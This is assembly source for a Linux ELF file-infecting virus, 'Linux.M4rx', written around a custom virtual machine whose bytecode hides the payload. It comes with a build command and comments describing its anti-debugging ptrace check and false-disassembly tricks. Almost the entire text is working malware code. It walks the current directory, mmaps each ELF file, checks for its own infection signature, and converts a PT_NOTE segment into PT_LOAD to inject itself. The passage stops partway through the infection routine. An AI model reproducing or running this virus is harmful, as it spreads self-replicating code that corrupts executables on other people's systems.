; .____    .__         ________   _____        _____      _____
; |    |   |__| ____  /  _____/  /  |  |      /     \    /  |  |__________  ___    _____    ______ _____
; |    |   |  |/    \/   __  \  /   |  |_    /  \ /  \  /   |  |\_  __ \  \/  /    \__  \  /  ___//     \
; |    |___|  |   |  \  |__\  \/    ^   /   /    Y    \/    ^   /|  | \/>    <      / __ \_\___ \|  Y Y  \
; |_______ \__|___|  /\_____  /\____   | /\ \____|__  /\____   | |__|  /__/\_ \ /\ (____  /____  >__|_|  /
;         \/       \/       \/      |__| \/         \/      |__|             \/ \/      \/     \/      \/

; A Virtualized virus, by s01den
; Don't spread this shit into the wild...

; Build command: nasm -f elf64 Linux.M4rx.asm ; ld Linux.M4rx.o -o m4rx

; features: - Virtualized virus, infecting every ELF which is in the same directory (PIE or not), with PT_NOTE to PT_LOAD injection
;           - Antidbg (virtualized ptrace checking)
;           - False disassembly in some places

; The epic schema:

;                 +---------- SPIDER ----------+
;                 | main code                  |            +-- H --+ <=== Handlers table
;                 |                            |            |___H1__|       = the links between the real registers and the virtual registers
;                 | f: I -> H                  |--- EXEC ---|___H2__|
;            -----|    Ii -> Hi                |            |__...__|
;            |    | SPIDER = f(VX)             |            |___Hn__|
;            |    +----------------------------+
;            |                                |         +-- VX --+
;      +----------------------------------+   |__CHECK__|___I1___|                 +--- Virtual Stack ---+      +---VirtualRegistersTable ---+
;      | I = List of virtual instructions |             |___I2___|                 |_________S1__________|      |  R1  |  R2  |  ...  |  Rn  |
;      +----------------------------------+             |__...___|                 |_________..._________|      +----------------------------+
;                        ^                              |___In___|                 |_________Sn__________|         ^___ R1 = VPC (virtual program counter)
;            Symbolized by a matrix of bytes

; each instruction is made of 8 bytes (with useless random bytes to confuse disassembling)
%define NOP1 db 0x01,0xab,0x29,0x43,0x28,0xcc,0x80,0xfa
%define PUSH_R(x) db 0x02,x,0xd5,0x24,0xf8,0xff,0xff,0x7f
%define POP_R(x) db 0x03,x,0x7a,0xee,0xf7,0x64,0x21,0xc5
%define MOV_Rx_Ry(x,y) db 0x04,x,y,0x2e,0xc3,0xec,0x92,0xf
%define XOR_Rx_Ry(x,y) db 0x05,x,y,0xb2,0xf9,0xe7,0x6,0x11
%define SYSCALL(x) db 0x06,x,0x9d,0x9c,0x75,0xbd,0xa,0xbe
%define NOP2 db 0x07,0xc3,0x77,0x73,0xb5,0xc4,0xe8,0x5d
%define SUB_Reg_to_Reg(x,y) db 0x08,x,y,0x5,0xf3,0x45,0x62,0xed
%define ADD_Reg_to_Reg(x,y) db 0x09,x,y,0xa0,0xe6,0x35,0xde,0x4f
%define PUT_EIP_IN_R(x) db 0x0a,x,0x56,0x9a,0x74,0x76,0x6b,0x2e
%define PUSH_B(x) db 0x0b,x,0xab,0xaa,0x24,0xde,0x83,0xdf
%define PUSH_W(x,y) db 0x0c,x,y,0xe,0x8f,0xee,0x4f,0x1c
%define PUSH_DW(x,y,z,t) db 0x0d,x,y,z,t,0x22,0x9f,0x22
%define JMP_REL(x,y) db 0x0e,x,y,0x7f,0xee,0xf0,0xd,0x5 ; the first argument determines if we jump forward or backward
%define MOV_B(r,x) db 0x0f,r,x,0x4e,0x5e,0xf6,0xaf,0x4a
%define MOV_W(r,x,y) db 0x10,r,x,y,0x58,0x72,0x62,0x4f
%define MOV_DW(r,x,y,z,t) db 0x11,r,x,y,z,t,0xaa,0x5c
%define JMP_NE(b,n,x,y) db 0x12,b,n,x,y,0xff,0x27,0x3a ; jumps n instructions (b_ackward or not) if Rx != Ry
%define JMP_EQ(b,n,x,y) db 0x13,b,n,x,y,0xc4,0xd6,0xff ; jumps n instructions (b_ackward or not) if Rx == Ry
%define LOAD_I_B(r,a,b,c,d,e,f) db 0x14,r,a,b,c,d,e,f ; <=> MOV R, BYTE [ABCDEFG]
%define LOAD_REG_B(r,a) db 0x15,r,a,0xc6,0xc7,0xb7,0xe0,0x9b ; <=> MOV R, BYTE [A]
%define LOAD_I_W(r,a,b,c,d,e,f) db 0x16,r,a,b,c,d,e,f
%define LOAD_REG_W(r,a) db 0x17,r,a,0x9,0xe4,0xf3,0xa2,0xcd
%define LOAD_I_DW(r,a,b,c,d,e,f) db 0x18,r,a,b,c,d,e,f
%define LOAD_REG_DW(r,a) db 0x19,r,a,0xb8,0x2c,0x2c,0x2,0xe2
%define STORE_I_B(r,a,b,c,d,e,f) db 0x1a,r,a,b,c,d,e,f ; <=> MOV BYTE [ABCDEFG], R
%define STORE_REG_B(r,a) db 0x1b,r,a,0x22,0xc7,0x13,0xee,0x5b ; <=> MOV BYTE [A], R
%define STORE_I_W(r,a,b,c,d,e,f) db 0x1c,r,a,b,c,d,e,f
%define STORE_REG_W(r,a) db 0x1d,r,a,0xe7,0x56,0x1b,0xda,0xb0
%define STORE_I_DW(r,a,b,c,d,e,f) db 0x1e,r,a,b,c,d,e,f
%define STORE_REG_DW(r,a) db 0x1f,r,a,0x2d,0x1d,0xc4,0x9e,0x6a
%define JMP_NEG(b,n,r) db 0x20,b,n,r,0xf8,0xbb,0x9a,0x36 ;  jumps n instructions (b_ackward or not) if Rx < 0

%define NBR_REG 13

%define START_ARG_REG 8+NBR_REG*8
%define A0 START_ARG_REG
%define A1 START_ARG_REG+8
%define A2 START_ARG_REG+2*8
%define A3 START_ARG_REG+3*8
%define A4 START_ARG_REG+4*8
%define A5 START_ARG_REG+5*8
%define RET_REG START_ARG_REG+8*6

%define VSP 0

%define A0_PARAM 1+NBR_REG
%define A1_PARAM 2+NBR_REG
%define A2_PARAM 3+NBR_REG
%define A3_PARAM 4+NBR_REG
%define A4_PARAM 5+NBR_REG
%define A5_PARAM 6+NBR_REG
%define RET_REG_PARAM 7+NBR_REG

section .text
global _start

_start:
xor rax, rax ; rax will hold the program counter (pc)
xor rbx, rbx ; rbx will be a buffer register
xor rcx, rcx ; rcx will hold the first argument of an instruction
xor rdx, rdx ; rdx will hold the second argument of an instruction
xor rsi, rsi ; rsi will point to the virtual context (list of all virutal registers (VR))
xor rdi, rdi ; rdi will point to the virus code
mov r14, rsp ; save to be able to restore the stack in infected program (avoid crashes when returning to OEP)

mov rsi, rsp
sub rsi, 8*(8+NBR_REG)

call spider.get_rip
add rax, 0x724
lea rdi, [rax]
xor rax, rax

clear_VRs:
mov qword [rsi+rax], 0x0
add rax, 0x8
cmp rax, 8*(8+NBR_REG)
jne clear_VRs
xor rax, rax

mov qword [rsi], rsp ; r0 = VSP (Virtual stack pointer)
add rsp, 0x600

; So here is the organisation of the memory:
; (each reg is made of 8 bytes (qword))
;  +----------------------------------------------+
;  | Virtual Context: 8+8*(NBR_REG)+8*6+8 bytes   | <--- [VSP][r0][...][r(NBR_REG-1)][a0][a1][a2][a3][a4][a5][ret]
;  +----------------------------------------------+
;  |          Virtual Stack: 0x600 bytes          |
;  +----------------------------------------------+
;  |         Real Stack: a lot of bytes           |
;  +----------------------------------------------+

jmp jmp_over+2
jmp_over:
  db `\xb8\xd9`
spider: ; the code which does the links between virtual virus code and handlers
mov rbx, qword [rdi+rax] ; rbx contains the current virtual opcode

cmp bl, 0x1 ; NOP1
je handlers_table.NOP
cmp bl, 0x2 ; PUSHR
je handlers_table.PUSH_Reg
cmp bl, 0x3 ; POP_R
je handlers_table.POP_Reg
cmp bl, 0x4 ; MOV_Reg_to_Reg
je handlers_table.MOV_Reg_to_Reg
cmp bl, 0x5 ; XOR_Reg_to_Reg
je handlers_table.XOR_Reg_to_Reg
cmp bl, 0x6 ; SYSCALL
je handlers_table.SYSCALL
cmp bl, 0x7 ; NOP2
je handlers_table.NOP
cmp bl, 0x8 ; SUB_Reg_to_Reg
je handlers_table.SUB_Reg_to_Reg
cmp bl, 0x9 ; ADD_Reg_to_Reg
je handlers_table.ADD_Reg_to_Reg
cmp bl, 0x0a ; PUT_EIP_IN_R
je handlers_table.PUT_EIP_IN_R
cmp bl, 0x0b ; PUSH_BYTE
je handlers_table.PUSH_BYTE
cmp bl, 0x0c ; PUSH_BYTE
je handlers_table.PUSH_WORD
cmp bl, 0x0d ; PUSH_BYTE
je handlers_table.PUSH_DWORD
cmp bl, 0x0e ; JMP
je handlers_table.JMP
cmp bl, 0x0f ; MOV_B
je handlers_table.MOV_BYTE
cmp bl, 0x10 ; MOV_WORD
je handlers_table.MOV_WORD
cmp bl, 0x11 ; MOV_B
je handlers_table.MOV_DWORD
cmp bl, 0x12 ; JMP_NE
je handlers_table.JMPNE
cmp bl, 0x13 ; JMP_NE
je handlers_table.JMPEQ
cmp bl, 0x14 ; LOAD_I_BYTE
je handlers_table.LOAD_I_BYTE
cmp bl, 0x15 ; LOAD_REG_BYTE
je handlers_table.LOAD_REG_BYTE
cmp bl, 0x16
je handlers_table.LOAD_I_WORD
cmp bl, 0x17
je handlers_table.LOAD_REG_WORD
cmp bl, 0x18
je handlers_table.LOAD_I_DWORD
cmp bl, 0x19
je handlers_table.LOAD_REG_DWORD
cmp bl, 0x1a
je handlers_table.STORE_I_BYTE
cmp bl, 0x1b
je handlers_table.STORE_REG_BYTE
cmp bl, 0x1c
je handlers_table.STORE_I_WORD
cmp bl, 0x1d
je handlers_table.STORE_REG_WORD
cmp bl, 0x1e
je handlers_table.STORE_I_DWORD
cmp bl, 0x1f
je handlers_table.STORE_REG_DWORD
cmp bl, 0x20
je handlers_table.JMPNEG

jmp spider.cmp_end
.jmp_over2:
.get_rip:
  mov rax, [rsp]
  ret
  db `\x48\x31`
.cmp_end:
cmp rax, virus_end-code-5
jl spider

exit:
mov rax, 60
mov rdi, 0x1337
syscall
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop

handlers_table:
.NOP:
  add rax, 0x8 ; pc += 8
  jmp spider.cmp_end

.SYSCALL:
  xor rcx, rcx
  xor rdx, rdx
  xor rbx, rbx
  mov bl, byte [rdi+rax+1] ; mov the syscall number in rbx
  push rax
  push rdi
  push rsi
  push rdx
  push r10
  push r8
  push r9
  mov rdi, qword [rsi+A0] ; a0 = 1st syscall argument
  mov rdx, qword [rsi+A2] ; a2 = 3rd syscall argument
  mov r10, qword [rsi+A3] ; a3 = 4th syscall argument
  mov r8, qword [rsi+A4] ; a4 = 5th syscall argument
  mov r9, qword [rsi+A5] ; a5 = 6th syscall argument
  mov rsi, qword [rsi+A1] ; a1 = 2nd syscall argument
  jmp .jmp_over3+2
  .jmp_over3:
      db `\x80\x87`
  mov rax, rbx
  mov rbx, rsp
  syscall
  mov rsp, rbx
  pop r9
  pop r8
  pop r10
  pop rdx
  pop rsi
  mov qword [rsi+RET_REG], rax ; mov the syscall return value into the ret-reg
  pop rdi
  pop rax
  add rax, 0x8
  jmp spider.cmp_end

.MOV_Reg_to_Reg:
  xor rcx, rcx
  xor rdx, rdx
  mov cl, byte [rdi+rax+1] ; rcx = Rx
  mov dl, byte [rdi+rax+2] ; rdx = Ry
  push rbx
  mov rbx, qword [rsi+rdx*8]
  mov qword [rsi+rcx*8], rbx
  pop rbx
  add rax, 0x8 ; pc += 8
  jmp spider.cmp_end

.SUB_Reg_to_Reg:
  xor rcx, rcx
  xor rdx, rdx
  mov cl, byte [rdi+rax+1] ; rcx = Rx
  mov dl, byte [rdi+rax+2] ; rdx = Ry
  mov rbx, qword [rsi+rdx*8]
  sub qword [rsi+rcx*8], rbx
  add rax, 0x8
  jmp spider.cmp_end

.ADD_Reg_to_Reg:
  xor rcx, rcx
  xor rdx, rdx
  mov cl, byte [rdi+rax+1] ; rcx = Rx
  mov dl, byte [rdi+rax+2] ; rdx = Ry
  mov rbx, qword [rsi+rdx*8]
  add qword [rsi+rcx*8], rbx
  add rax, 0x8
  jmp spider.cmp_end

.XOR_Reg_to_Reg:
  xor rcx, rcx
  xor rdx, rdx
  mov cl, byte [rdi+rax+1] ; rcx = Rx
  mov dl, byte [rdi+rax+2] ; rdx = Ry
  mov rbx, qword [rsi+rcx*8]
  xor qword [rsi+rdx*8], rbx
  add rax, 0x8
  jmp spider.cmp_end

.PUSH_Reg:
  xor rcx, rcx
  xor rdx, rdx
  mov cl, byte [rdi+rax+1] ; rcx = Rx
  mov rbx, qword [rsi+rcx*8] ; mov the content of Rx into RBX
  mov rcx, qword [rsi] ; mov the VSP into RCX
  mov dword [rcx], ebx ; do the push
  add qword [rsi], 0x4
  add rax, 0x8
  jmp spider.cmp_end

.PUSH_BYTE:
  xor rcx, rcx
  mov cl, byte [rdi+rax+1]
  mov rdx, qword [rsi] ; mov the VSP into RDX
  mov byte [rdx], cl ; do the push
  add qword [rsi], 0x1
  add rax, 0x8
  jmp spider.cmp_end

.PUSH_WORD:
  xor rcx, rcx
  mov cl, byte [rdi+rax+1]
  shl rcx, 8
  mov cl, byte [rdi+rax+2]
  mov rdx, qword [rsi] ; mov the VSP into RDX
  mov word [rdx], cx ; do the push
  add qword [rsi], 0x2
  add rax, 0x8
  jmp spider.cmp_end

.PUSH_DWORD:
  xor rcx, rcx
  mov cl, byte [rdi+rax+1]
  shl rcx, 8
  mov cl, byte [rdi+rax+2]
  shl rcx, 8
  mov cl, byte [rdi+rax+3]
  shl rcx, 8
  mov cl, byte [rdi+rax+4]
  mov rdx, qword [rsi] ; mov the VSP into RDX
  mov dword [rdx], ecx ; do the push
  add qword [rsi], 0x4
  add rax, 0x8
  jmp spider.cmp_end

  .MOV_BYTE:
    xor rcx, rcx
    xor rdx, rdx
    mov dl, byte [rdi+rax+1]
    mov cl, byte [rdi+rax+2]
    mov byte [rsi+rdx*8], cl
    add rax, 0x8
    jmp spider.cmp_end

  .MOV_WORD:
    xor rcx, rcx
    xor rdx, rdx
    mov dl, byte [rdi+rax+1]
    mov cl, byte [rdi+rax+2]
    shl rcx, 8
    mov cl, byte [rdi+rax+3]
    mov word [rsi+rdx*8], cx
    add rax, 0x8
    jmp spider.cmp_end

  .MOV_DWORD:
    xor rcx, rcx
    xor rdx, rdx
    mov dl, byte [rdi+rax+1]
    mov cl, byte [rdi+rax+2]
    shl rcx, 8
    mov cl, byte [rdi+rax+3]
    shl rcx, 8
    mov cl, byte [rdi+rax+4]
    shl rcx, 8
    mov cl, byte [rdi+rax+5]
    mov dword [rsi+rdx*8], ecx
    add rax, 0x8
    jmp spider.cmp_end

.POP_Reg:
  xor rcx, rcx
  xor rdx, rdx
  sub qword [rsi], 0x8
  mov cl, byte [rdi+rax+1] ; rcx = Rx
  mov rdx, qword [rsi] ; mov the VSP into Rdx
  mov rbx, qword [rdx] ; do the pop
  mov qword [rsi+rcx*8], rbx
  ;sub qword [rsi], 0x8
  add rax, 0x8
  jmp spider.cmp_end

.PUT_EIP_IN_R:
  xor rcx, rcx
  mov cl, byte[rdi+rax+1]
  push rax
  call spider.get_rip
  mov qword [rsi+rcx*8], rax
  pop rax
  add rax, 0x8
  jmp spider.cmp_end

  .STORE_I_BYTE:
   xor rcx, rcx
   xor rdx, rdx
   xor rbx, rbx

   mov dl, byte [rdi+rax+1]

   mov cl, byte [rdi+rax+2]
   shl rcx, 8
   mov cl, byte [rdi+rax+3]
   shl rcx, 8
   mov cl, byte [rdi+rax+4]
   shl rcx, 8
   mov cl, byte [rdi+rax+5]
   shl rcx, 8
   mov cl, byte [rdi+rax+6]
   shl rcx, 8
   mov cl, byte [rdi+rax+7]

   mov bl, byte [rsi+rdx*8]
   mov byte [rcx], bl

   add rax, 0x8
   jmp spider.cmp_end

 .STORE_REG_BYTE:
   xor rcx, rcx
   xor rdx, rdx
   xor rbx, rbx

   mov dl, byte [rdi+rax+1]
   mov cl, byte [rdi+rax+2]

   mov rbx, qword [rsi+rcx*8]
   mov dl, byte [rsi+rdx*8]

   mov byte [rbx], dl

   add rax, 0x8
   jmp spider.cmp_end

   .STORE_I_WORD:
    xor rcx, rcx
    xor rdx, rdx
    xor rbx, rbx

    mov dl, byte [rdi+rax+1]

    mov cl, byte [rdi+rax+2]
    shl rcx, 8
    mov cl, byte [rdi+rax+3]
    shl rcx, 8
    mov cl, byte [rdi+rax+4]
    shl rcx, 8
    mov cl, byte [rdi+rax+5]
    shl rcx, 8
    mov cl, byte [rdi+rax+6]
    shl rcx, 8
    mov cl, byte [rdi+rax+7]

    mov bx, word [rsi+rdx*8]
    mov word [rcx], bx

    add rax, 0x8
    jmp spider.cmp_end

  .STORE_REG_WORD:
    xor rcx, rcx
    xor rdx, rdx
    xor rbx, rbx

    mov dl, byte [rdi+rax+1]
    mov cl, byte [rdi+rax+2]

    mov rbx, qword [rsi+rcx*8]
    mov dx, word [rsi+rdx*8]

    mov word [rbx], dx

    add rax, 0x8
    jmp spider.cmp_end

 .STORE_I_DWORD:
   xor rcx, rcx
   xor rdx, rdx
   xor rbx, rbx

   mov dl, byte [rdi+rax+1]

   mov cl, byte [rdi+rax+2]
   shl rcx, 8
   mov cl, byte [rdi+rax+3]
   shl rcx, 8
   mov cl, byte [rdi+rax+4]
   shl rcx, 8
   mov cl, byte [rdi+rax+5]
   shl rcx, 8
   mov cl, byte [rdi+rax+6]
   shl rcx, 8
   mov cl, byte [rdi+rax+7]

   mov ebx, dword [rsi+rdx*8]
   mov dword [rcx], ebx

   add rax, 0x8
   jmp spider.cmp_end

 .STORE_REG_DWORD:
   xor rcx, rcx
   xor rdx, rdx
   xor rbx, rbx

   mov dl, byte [rdi+rax+1]
   mov cl, byte [rdi+rax+2]

   mov rbx, qword [rsi+rcx*8]
   mov edx, dword [rsi+rdx*8]

   mov dword [rbx], edx

   add rax, 0x8
   jmp spider.cmp_end

 .LOAD_I_BYTE:
  xor rcx, rcx
  xor rdx, rdx
  xor rbx, rbx

  mov dl, byte [rdi+rax+1]

  mov cl, byte [rdi+rax+2]
  shl rcx, 8
  mov cl, byte [rdi+rax+3]
  shl rcx, 8
  mov cl, byte [rdi+rax+4]
  shl rcx, 8
  mov cl, byte [rdi+rax+5]
  shl rcx, 8
  mov cl, byte [rdi+rax+6]
  shl rcx, 8

  mov cl, byte [rdi+rax+7]
  mov bl, byte [rcx]
  mov byte [rsi+rdx*8], bl

  add rax, 0x8
  jmp spider.cmp_end

.LOAD_REG_BYTE:
  xor rcx, rcx
  xor rdx, rdx
  xor rbx, rbx

  mov dl, byte [rdi+rax+1]
  mov cl, byte [rdi+rax+2]

  mov rbx, qword [rsi+rcx*8]
  mov cl, byte [rbx]
  mov byte [rsi+rdx*8], cl

  add rax, 0x8
  jmp spider.cmp_end

  .LOAD_I_WORD:
   xor rcx, rcx
   xor rdx, rdx
   xor rbx, rbx

   mov dl, byte [rdi+rax+1]

   mov cl, byte [rdi+rax+2]
   shl rcx, 8
   mov cl, byte [rdi+rax+3]
   shl rcx, 8
   mov cl, byte [rdi+rax+4]
   shl rcx, 8
   mov cl, byte [rdi+rax+5]
   shl rcx, 8
   mov cl, byte [rdi+rax+6]
   shl rcx, 8
   mov cl, byte [rdi+rax+7]

   mov bx, word [rcx]
   mov word [rsi+rdx*8], bx

   add rax, 0x8
   jmp spider.cmp_end

 .LOAD_REG_WORD:
   xor rcx, rcx
   xor rdx, rdx
   xor rbx, rbx

   mov dl, byte [rdi+rax+1]
   mov cl, byte [rdi+rax+2]

   mov rbx, qword [rsi+rcx*8]
   mov cx, word [rbx]
   mov word [rsi+rdx*8], cx

   add rax, 0x8
   jmp spider.cmp_end

.LOAD_I_DWORD:
  xor rcx, rcx
  xor rdx, rdx
  xor rbx, rbx

  mov dl, byte [rdi+rax+1]

  mov cl, byte [rdi+rax+2]
  shl rcx, 8
  mov cl, byte [rdi+rax+3]
  shl rcx, 8
  mov cl, byte [rdi+rax+4]
  shl rcx, 8
  mov cl, byte [rdi+rax+5]
  shl rcx, 8
  mov cl, byte [rdi+rax+6]
  shl rcx, 8
  mov cl, byte [rdi+rax+7]

  mov ebx, dword [rcx]
  mov dword [rsi+rdx*8], ebx

  add rax, 0x8
  jmp spider.cmp_end

.LOAD_REG_DWORD:
  xor rcx, rcx
  xor rdx, rdx
  xor rbx, rbx

  mov dl, byte [rdi+rax+1]
  mov cl, byte [rdi+rax+2]

  mov rbx, qword [rsi+rcx*8]

  mov ecx, dword [rbx]
  mov dword [rsi+rdx*8], ecx

  add rax, 0x8
  jmp spider.cmp_end

.JMP:
  xor rbx, rbx
  xor rdx, rdx
  mov dl, byte [rdi+rax+2] ; rdx = Ry = the number of bytes to jump
  imul rdx, 0x8
  xor rcx, rcx
  mov cl, byte [rdi+rax+1] ; rcx = Rx = set to one if jump backward
  add rax, 0x8
  test rcx, rcx
  jnz .sub

  .add:
    add rax, rdx
    jmp spider.cmp_end
  .sub:
    sub rax, rdx
    jmp spider.cmp_end

.JMPNE:
  xor rdx, rdx
  xor rcx, rcx
  mov cl, byte [rdi+rax+3]
  mov dl, byte [rdi+rax+4]
  mov rcx, qword [rsi+rcx*8]
  mov rdx, qword [rsi+rdx*8]
  cmp rcx, rdx
  je .endne
  xor rdx, rdx
  mov dl, byte [rdi+rax+2] ; rdx = the number of bytes to jump
  imul rdx, 0x8
  xor rcx, rcx
  mov cl, byte [rdi+rax+1] ; rcx = set to one if jump backward
  test rcx, rcx
  jnz .subne

  .addne:
    add rax, rdx
    jmp .endne
  .subne:
    sub rax, rdx
    jmp spider.cmp_end
  .endne:
    add rax, 0x8
    jmp spider.cmp_end

.JMPEQ:
  xor rcx, rcx
  xor rdx, rdx
  mov cl, byte [rdi+rax+3]
  mov dl, byte [rdi+rax+4]
  mov rcx, qword [rsi+rcx*8]
  mov rdx, qword [rsi+rdx*8]
  cmp rcx, rdx
  jne .endeq
  xor rdx, rdx
  xor rcx, rcx
  mov cl, byte [rdi+rax+1] ; rcx = set to one if jump backward
  mov dl, byte [rdi+rax+2] ; rdx = the number of bytes to jump
  imul rdx, 0x8
  test rcx, rcx
  jnz .subeq

  .addeq:
    add rax, rdx
    jmp .endeq
  .subeq:
    sub rax, rdx
  .endeq:
    add rax, 0x8
    jmp spider.cmp_end

.JMPNEG:
  xor rbx, rbx
  xor rdx, rdx
  mov dl, byte [rdi+rax+2] ; rdx = the number of bytes to jump
  imul rdx, 0x8
  xor rcx, rcx
  mov cl, byte [rdi+rax+1] ; rcx = set to one if jump backward
  mov bl, byte [rdi+rax+3] ; rbx = reg
  mov rbx, qword [rsi+rbx*8]
  add rax, 0x8
  cmp rbx, 0
  jng .continue_neg
  jmp spider.cmp_end
  .continue_neg:
    test rcx, rcx
    jnz .sub_neg
  .add_neg:
      add rax, rdx
      jmp spider.cmp_end
  .sub_neg:
      sub rax, rdx
      jmp spider.cmp_end

code:
  PUT_EIP_IN_R(11)
  ; ANTIDBG
  MOV_B(A0_PARAM, 0)
  MOV_B(A1_PARAM, 0)
  MOV_B(A2_PARAM, 1)
  MOV_B(A3_PARAM, 0)
  SYSCALL(101) ; ptrace
  MOV_Rx_Ry(2,RET_REG_PARAM)
  MOV_B(A0_PARAM, 0)
  JMP_NE(0,1,2,A0_PARAM) ; TO UNCOMMENT !!!
  JMP_REL(0, 2)
  MOV_B(A0_PARAM,123)
  SYSCALL(0x3c) ; exit
  MOV_B(A0_PARAM, 1)
  XOR_Rx_Ry(A1_PARAM, A1_PARAM)
  MOV_Rx_Ry(A1_PARAM, VSP)
  PUSH_DW(0x41,0x43,0x41,0x42)
  MOV_B(A2_PARAM, 4)
  SYSCALL(1) ; write

  ; OPENNING
  XOR_Rx_Ry(A0_PARAM, A0_PARAM)
  MOV_Rx_Ry(A0_PARAM, VSP)
  PUSH_B('.')
  XOR_Rx_Ry(A1_PARAM, A1_PARAM)
  SYSCALL(2) ; open('.', O_RDONLY)
  MOV_Rx_Ry(A0_PARAM, RET_REG_PARAM)
  MOV_Rx_Ry(A1_PARAM, VSP)
  XOR_Rx_Ry(A2_PARAM, A2_PARAM)
  MOV_W(A2_PARAM, 0x04, 0x00)
  SYSCALL(217)
  MOV_Rx_Ry(7, RET_REG_PARAM)
;  XOR_Rx_Ry(3,3)
;  MOV_B(3,0x10)
  ADD_Reg_to_Reg(VSP, 3)
  XOR_Rx_Ry(6,6) ; reg6 will be the counter

  ; LOOP_INFECTION
  MOV_Rx_Ry(2, VSP)
  XOR_Rx_Ry(3,3)
  MOV_B(3,0x13) ; d_name
  ADD_Reg_to_Reg(2,3) ; reg2 contains the name of the current file
  MOV_Rx_Ry(4,VSP)
  XOR_Rx_Ry(5,5)
  MOV_Rx_Ry(5,VSP)
  MOV_B(3,0x12)
  ADD_Reg_to_Reg(5, 3)
  LOAD_REG_B(3, 5) ; get the type of data
  JMP_REL(0,12) ; GOTO INFECT
  MOV_Rx_Ry(VSP, 4)
  XOR_Rx_Ry(5,5)
  MOV_Rx_Ry(5,VSP)
  XOR_Rx_Ry(3,3)
  MOV_B(3,0x10) ; d_name
  ADD_Reg_to_Reg(5, 3) ; the buffer position += d_reclen
  XOR_Rx_Ry(4,4)
  LOAD_REG_W(4,5)
  ADD_Reg_to_Reg(6,4)
  ADD_Reg_to_Reg(VSP, 4)
  JMP_NE(1,21,6,7)
  JMP_REL(0,180) ; GOTO EXIT

  ; INFECT
  XOR_Rx_Ry(8,8) ; first, we're cheking if the file to infect is actually a file or a directory
  MOV_B(8,0x8)
  JMP_NE(1,14,3,8)

  MOV_Rx_Ry(12, 2)
  MOV_Rx_Ry(A0_PARAM, 2) ; then, we open the file
  XOR_Rx_Ry(A1_PARAM, A1_PARAM)
  MOV_W(A1_PARAM,0x04,0x02)
  SYSCALL(2)
  JMP_NEG(1,20,RET_REG_PARAM)


  MOV_Rx_Ry(2, RET_REG_PARAM) ; reg2 now contains the fd of the file
  MOV_Rx_Ry(A0_PARAM, 2)
  MOV_Rx_Ry(A1_PARAM, VSP)
  MOV_W(8,0x10,00)
  ADD_Reg_to_Reg(A1_PARAM,8)
  SYSCALL(5) ; fstat (to know the size of the file)

  XOR_Rx_Ry(8,8)
  MOV_B(8,0x30)
  ADD_Reg_to_Reg(A1_PARAM,8) ; reg9 points to the size of the current file
  MOV_Rx_Ry(9, A1_PARAM)
  XOR_Rx_Ry(A1_PARAM, A1_PARAM)
  XOR_Rx_Ry(A0_PARAM, A0_PARAM)
  LOAD_REG_DW(A1_PARAM, 9)
  MOV_B(8,0x6)
  MOV_Rx_Ry(A2_PARAM, 8)
  MOV_B(8,0x1)
  MOV_Rx_Ry(A3_PARAM, 8)
  MOV_Rx_Ry(A4_PARAM, 2)
  XOR_Rx_Ry(A5_PARAM, A5_PARAM)
  SYSCALL(9) ; mmap MAP_SHARED

  LOAD_REG_DW(A0_PARAM, 9)
  MOV_Rx_Ry(9, A0_PARAM)
  ; here we're looking for the elf magic bytes
  MOV_Rx_Ry(10, RET_REG_PARAM) ; reg10 points to the mmaped area
  XOR_Rx_Ry(5,5)
  LOAD_REG_DW(5, 10)
  MOV_DW(8, 0x46, 0x4c, 0x45, 0x7f)
  JMP_NE(0,15,8,5)              ; <--------------- to change

  ; check bits
  XOR_Rx_Ry(8,8)
  MOV_B(8,0x4)
  MOV_Rx_Ry(5,10)
  ADD_Reg_to_Reg(5,8)
  XOR_Rx_Ry(A0_PARAM, A0_PARAM)
  LOAD_REG_B(A0_PARAM, 5)
  MOV_B(8,0x2)
  JMP_NE(0,7,8,A0_PARAM)             ; <--------------- to change

  ; check virus signature
  XOR_Rx_Ry(8,8)
  MOV_B(8,0x9)
  MOV_Rx_Ry(5, 10)
  ADD_Reg_to_Reg(5,8)
  LOAD_REG_DW(A0_PARAM, 5)
  MOV_DW(8, 0xde, 0xad, 0xc0, 0xde)
  JMP_NE(0,4,8,A0_PARAM)

  ; close and return to the loop
  XOR_Rx_Ry(8,8)
  MOV_Rx_Ry(A0_PARAM, 2)
  SYSCALL(3) ; close
  JMP_REL(1,67)

  ;parse_phdr:
  XOR_Rx_Ry(8,8)
  XOR_Rx_Ry(5,5)
  MOV_B(8, 0x20)
  MOV_Rx_Ry(A0_PARAM, 10)
  ADD_Reg_to_Reg(A0_PARAM, 8)
  LOAD_REG_DW(5, A0_PARAM) ; reg5 contains the offset of the program header table
  MOV_B(8, 0x16)
  ADD_Reg_to_Reg(A0_PARAM, 8)
  LOAD_REG_W(A1_PARAM, A0_PARAM)  ; A1_PARAM contains the size of an entry in the program header table
  MOV_B(8, 0x2)
  ADD_Reg_to_Reg(A0_PARAM, 8)
  LOAD_REG_W(8, A0_PARAM) ; reg8 contains the number of entries in the program header table

  ;loop_phdr:
  ADD_Reg_to_Reg(5, A1_PARAM)
  XOR_Rx_Ry(A0_PARAM, A0_PARAM)
  MOV_B(A0_PARAM, 0x1)
  SUB_Reg_to_Reg(8, A0_PARAM)
  MOV_Rx_Ry(A0_PARAM, 10)
  ADD_Reg_to_Reg(A0_PARAM, 5)
  XOR_Rx_Ry(A2_PARAM, A2_PARAM)
  LOAD_REG_B(A2_PARAM, A0_PARAM)
  MOV_Rx_Ry(A0_PARAM, A2_PARAM)
  XOR_Rx_Ry(A2_PARAM, A2_PARAM)
  MOV_B(A2_PARAM, 0x4) ; check if the segment is PT_NOTE
  JMP_EQ(0,2,A0_PARAM, A2_PARAM)
  XOR_Rx_Ry(A2_PARAM, A2_PARAM)
  JMP_NE(1,13,8,A2_PARAM)

  ;pt_note_found!! let's start the true infection
  ; first: write the signature of the virus
  MOV_Rx_Ry(A0_PARAM, 10)
  XOR_Rx_Ry(A2_PARAM, A2_PARAM)
  MOV_B(A2_PARAM, 0x9)
  ADD_Reg_to_Reg(A0_PARAM, A2_PARAM)
  MOV_DW(A2_PARAM, 0xde,0xad,0xc0,0xde)
  STORE_REG_DW(A2_PARAM, A0_PARAM)
  ; then change to PT_LOAD
  MOV_Rx_Ry(A0_PARAM, 10)
  ADD_Reg_to_Reg(A0_PARAM, 5)
  XOR_Rx_Ry(A2_PARAM, A2_PARAM)
  MOV_B(A2_PARAM, 0x01)
  STORE_REG_DW(A2_PARAM, A0_PARAM)
